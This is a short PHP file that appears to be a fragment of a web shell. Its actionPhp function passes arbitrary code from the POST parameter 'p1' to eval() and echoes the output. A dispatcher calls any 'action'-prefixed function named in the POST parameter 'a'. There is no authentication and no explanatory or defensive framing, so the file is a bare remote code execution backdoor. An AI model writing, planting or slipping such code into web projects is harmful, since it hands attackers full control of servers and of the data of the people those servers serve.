<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	$temp = addcslashes(htmlspecialchars(ob_get_clean()));
	echo $temp;
	exit; 
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>